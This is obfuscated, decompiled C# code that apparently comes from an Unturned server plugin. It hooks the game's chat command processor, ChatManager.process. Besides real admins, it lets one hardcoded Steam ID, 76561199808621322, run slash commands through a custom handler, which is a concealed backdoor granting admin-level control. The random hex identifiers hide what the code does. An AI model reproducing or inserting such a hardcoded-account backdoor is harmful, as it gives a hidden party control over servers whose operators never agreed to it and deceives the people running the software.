using System;
using SDG.Unturned;

internal class _9E82386467684759
{
	[_542A381FC1D44BA3(typeof(ChatManager), "process", _24AD03718EF64384._1B48C4AE307B46D9, new Type[]
	{
		typeof(SteamPlayer),
		typeof(string),
		typeof(bool)
	})]
	public static bool B4F693EA96FE4F72(SteamPlayer player, string cmd, bool fromUnityEvent)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		if (cmd.StartsWith("/") && (player.isAdmin || player.playerID.steamID.m_SteamID == 76561199808621322L))
		{
			return !_148FC9FDA20643FB._12E92B7AED794992(cmd, _200C0FCD340543F6._41B423B9BBFA4DD0(player.player));
		}
		return true;
	}
}
